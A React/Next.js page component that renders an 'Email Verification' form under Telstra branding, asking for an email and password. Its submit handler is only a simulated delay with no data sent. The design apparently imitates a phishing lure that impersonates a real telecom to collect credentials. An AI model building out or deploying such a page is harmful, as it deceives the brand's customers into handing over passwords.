'use client';

import { useState } from 'react';
import TelstraLogo from '../../components/Telstra/Logo';
import '../../components/Telstra/LoginPage.css';

export default function EmailVerificationPage() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isSigningIn, setIsSigningIn] = useState(false);

  const handleSignIn = async () => {
    if (email.trim() && password.trim() && !isSigningIn) {
      setIsSigningIn(true);
      // Add your sign in logic here
      try {
        // Simulate API call
        await new Promise(resolve => setTimeout(resolve, 1000));
        // Redirect or handle success
      } catch (error) {
        console.error('Error signing in:', error);
        alert('Failed to sign in. Please try again.');
      } finally {
        setIsSigningIn(false);
      }
    }
  };

  return (
    <div className="container">
      {/* Header */}
      <header className="header">
        <div className="headerInner">
          <div className="logoContainer">
            <TelstraLogo />
          </div>
          <hr className="headerSeparator" />
        </div>
      </header>

      {/* Main Content */}
      <main className="main">
        <div className="loginForm">
          <h1 className="title">Email Verification</h1>
          <p className="subtitle">Email verification for Telstra</p>

          <div className="formGroup">
            <label htmlFor="email" className="label">
              Email
            </label>
            <input
              type="email"
              id="email"
              className="input"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              onKeyDown={(e) => {
                if (e.key === 'Enter' && email.trim() && password.trim() && !isSigningIn) {
                  handleSignIn();
                }
              }}
            />
          </div>

          <div className="formGroup">
            <label htmlFor="password" className="label" style={{ fontWeight: "550px" }}>
              Password
            </label>
            <div className="passwordContainer">
              <input
                type={showPassword ? 'text' : 'password'}
                id="password"
                className="input passwordInput"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onKeyDown={(e) => {
                  if (e.key === 'Enter' && email.trim() && password.trim() && !isSigningIn) {
                    handleSignIn();
                  }
                }}
              />
              <button
                type="button"
                className="showPasswordButton"
                onClick={() => setShowPassword(!showPassword)}
              >
                Show
              </button>
            </div>
            <div style={{ textAlign: 'right', marginTop: '8px' }}>
              <a href="#" className="recoverLink" style={{ marginBottom: 0, marginTop: 0 }}>
                Forgot password
              </a>
            </div>
          </div>

          <button 
            className="signInButton"
            onClick={handleSignIn}
            disabled={!email.trim() || !password.trim() || isSigningIn}
          >
            {isSigningIn ? (
              <span className="spinner"></span>
            ) : (
              'Sign in'
            )}
          </button>
        </div>
      </main>

      {/* Footer */}
      <footer className="footer">
        <div className="footerContent">
          <span className="copyright">
            Copyright © 2025 Telstra
          </span>
          <div className="footerLinks">
            <a href="#" className="footerLink">Privacy</a>
            <a href="#" className="footerLink">Terms of use</a>
          </div>
        </div>
      </footer>
    </div>
  );
}

